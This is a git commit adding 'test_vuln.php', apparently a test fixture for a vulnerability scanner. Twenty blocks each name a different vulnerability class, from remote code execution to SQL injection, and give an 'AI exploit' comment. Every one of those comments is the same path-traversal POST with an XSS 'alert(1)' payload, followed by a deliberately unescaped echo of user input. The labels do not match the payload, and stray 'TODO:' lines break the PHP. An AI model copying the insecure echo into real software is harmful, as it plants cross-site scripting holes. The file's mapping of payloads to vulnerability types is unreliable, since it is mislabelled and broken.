1dcddab171e154d07d4d21c5e0a250e9a70a563b
userwithrepo <bugiz300@yandex.com>
2015-04-08 17:12:44 +0300

    Create test_vuln.php

---
+++ test_vuln.php
@@ -0,0 +1,229 @@
+<?php
+TODO: AI AFR issue #1, High, Arbitrary File Reading, https://github.com/userwithrepo/ACSI_S4/issues/1, 2639d1d0
+//AI exploit:
+//POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-f254c7b/admin.php HTTP/1.1
+//Host: localhost
+//Accept-Encoding: identity
+//Connection: close
+//Content-Type: application/x-www-form-urlencoded
+//Content-Length: 41
+//
+//e=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+echo $_POST['e'];
+
+TODO: AI RFI issue #1, High, Remote File Inclusion, https://github.com/userwithrepo/ACSI_S4/issues/1, 33c2998e
+//AI exploit:
+//POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-f254c7b/admin.php HTTP/1.1
+//Host: localhost
+//Accept-Encoding: identity
+//Connection: close
+//Content-Type: application/x-www-form-urlencoded
+//Content-Length: 41
+//
+//e=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+echo $_POST['e'];
+
+TODO: AI XXE issue #1, High, XML External Entity, https://github.com/userwithrepo/ACSI_S4/issues/1, 19d90cd3
+//AI exploit:
+//POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-f254c7b/admin.php HTTP/1.1
+//Host: localhost
+//Accept-Encoding: identity
+//Connection: close
+//Content-Type: application/x-www-form-urlencoded
+//Content-Length: 41
+//
+//e=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+echo $_POST['e'];
+
+TODO: AI XI issue #1, High, XPath Injection, https://github.com/userwithrepo/ACSI_S4/issues/1, 03b3909a
+//AI exploit:
+//POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-f254c7b/admin.php HTTP/1.1
+//Host: localhost
+//Accept-Encoding: identity
+//Connection: close
+//Content-Type: application/x-www-form-urlencoded
+//Content-Length: 41
+//
+//e=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+echo $_POST['e'];
+
+TODO: AI OR issue #1, Medium, Open Redirect, https://github.com/userwithrepo/ACSI_S4/issues/1, 6b761e41
+//AI exploit:
+//POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-f254c7b/admin.php HTTP/1.1
+//Host: localhost
+//Accept-Encoding: identity
+//Connection: close
+//Content-Type: application/x-www-form-urlencoded
+//Content-Length: 41
+//
+//e=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+echo $_POST['e'];
+
+TODO: AI OSC issue #1, High, OS commanding, https://github.com/userwithrepo/ACSI_S4/issues/1, b811f948
+//AI exploit:
+//POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-f254c7b/admin.php HTTP/1.1
+//Host: localhost
+//Accept-Encoding: identity
+//Connection: close
+//Content-Type: application/x-www-form-urlencoded
+//Content-Length: 41
+//
+//e=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+echo $_POST['e'];
+
+TODO: AI LF issue #1, Medium, Log Forging, https://github.com/userwithrepo/ACSI_S4/issues/1, adae3580
+//AI exploit:
+//POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-f254c7b/admin.php HTTP/1.1
+//Host: localhost
+//Accept-Encoding: identity
+//Connection: close
+//Content-Type: application/x-www-form-urlencoded
+//Content-Length: 41
+//
+//e=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+echo $_POST['e'];
+
+TODO: AI LFI issue #1, High, Local File Inclusion, https://github.com/userwithrepo/ACSI_S4/issues/1, dbe1396c
+//AI exploit:
+//POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-f254c7b/admin.php HTTP/1.1
+//Host: localhost
+//Accept-Encoding: identity
+//Connection: close
+//Content-Type: application/x-www-form-urlencoded
+//Content-Length: 41
+//
+//e=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+echo $_POST['e'];
+
+TODO: AI XSS issue #1, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/1, 859f8f04
+//AI exploit:
+//POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-f254c7b/admin.php HTTP/1.1
+//Host: localhost
+//Accept-Encoding: identity
+//Connection: close
+//Content-Type: application/x-www-form-urlencoded
+//Content-Length: 41
+//
+//e=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+echo $_POST['e'];
+
+TODO: AI AFD issue #1, High, Arbitrary File Deletion, https://github.com/userwithrepo/ACSI_S4/issues/1, 17ee5c4f
+//AI exploit:
+//POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-f254c7b/admin.php HTTP/1.1
+//Host: localhost
+//Accept-Encoding: identity
+//Connection: close
+//Content-Type: application/x-www-form-urlencoded
+//Content-Length: 41
+//
+//e=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+echo $_POST['e'];
+
+TODO: AI HRS issue #1, Medium, HTTP Response Splitting, https://github.com/userwithrepo/ACSI_S4/issues/1, 7352758a
+//AI exploit:
+//POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-f254c7b/admin.php HTTP/1.1
+//Host: localhost
+//Accept-Encoding: identity
+//Connection: close
+//Content-Type: application/x-www-form-urlencoded
+//Content-Length: 41
+//
+//e=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+echo $_POST['e'];
+
+TODO: AI UFP issue #1, High, Unrestricted File Upload, https://github.com/userwithrepo/ACSI_S4/issues/1, 4bf273b2
+//AI exploit:
+//POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-f254c7b/admin.php HTTP/1.1
+//Host: localhost
+//Accept-Encoding: identity
+//Connection: close
+//Content-Type: application/x-www-form-urlencoded
+//Content-Length: 41
+//
+//e=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+echo $_POST['e'];
+
+TODO: AI SSRF issue #1, High, SSRF, https://github.com/userwithrepo/ACSI_S4/issues/1, b1958670
+//AI exploit:
+//POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-f254c7b/admin.php HTTP/1.1
+//Host: localhost
+//Accept-Encoding: identity
+//Connection: close
+//Content-Type: application/x-www-form-urlencoded
+//Content-Length: 41
+//
+//e=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+echo $_POST['e'];
+
+TODO: AI RCE issue #1, High, Remote Code Execution, https://github.com/userwithrepo/ACSI_S4/issues/1, 96304f71
+//AI exploit:
+//POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-f254c7b/admin.php HTTP/1.1
+//Host: localhost
+//Accept-Encoding: identity
+//Connection: close
+//Content-Type: application/x-www-form-urlencoded
+//Content-Length: 41
+//
+//e=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+echo $_POST['e'];
+
+TODO: AI AFM issue #1, High, Arbitrary File Modification, https://github.com/userwithrepo/ACSI_S4/issues/1, 56f4b1fb
+//AI exploit:
+//POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-f254c7b/admin.php HTTP/1.1
+//Host: localhost
+//Accept-Encoding: identity
+//Connection: close
+//Content-Type: application/x-www-form-urlencoded
+//Content-Length: 41
+//
+//e=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+echo $_POST['e'];
+
+TODO: AI SQL issue #1, High, SQL Injection, https://github.com/userwithrepo/ACSI_S4/issues/1, 998907cb
+//AI exploit:
+//POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-f254c7b/admin.php HTTP/1.1
+//Host: localhost
+//Accept-Encoding: identity
+//Connection: close
+//Content-Type: application/x-www-form-urlencoded
+//Content-Length: 41
+//
+//e=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+echo $_POST['e'];
+
+TODO: AI AFC issue #1, High, Arbitrary File Creation, https://github.com/userwithrepo/ACSI_S4/issues/1, 259cff53
+//AI exploit:
+//POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-f254c7b/admin.php HTTP/1.1
+//Host: localhost
+//Accept-Encoding: identity
+//Connection: close
+//Content-Type: application/x-www-form-urlencoded
+//Content-Length: 41
+//
+//e=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+echo $_POST['e'];
+
+TODO: AI LDAP issue #1, High, LDAP Injection, https://github.com/userwithrepo/ACSI_S4/issues/1, 19a4f75c
+//AI exploit:
+//POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-f254c7b/admin.php HTTP/1.1
+//Host: localhost
+//Accept-Encoding: identity
+//Connection: close
+//Content-Type: application/x-www-form-urlencoded
+//Content-Length: 41
+//
+//e=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+echo $_POST['e'];
+
+TODO: AI DUD issue #1, High, Deserialization of Untrusted Data, https://github.com/userwithrepo/ACSI_S4/issues/1, fc212df5
+//AI exploit:
+//POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-f254c7b/admin.php HTTP/1.1
+//Host: localhost
+//Accept-Encoding: identity
+//Connection: close
+//Content-Type: application/x-www-form-urlencoded
+//Content-Length: 41
+//
+//e=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+echo $_POST['e'];
+?>
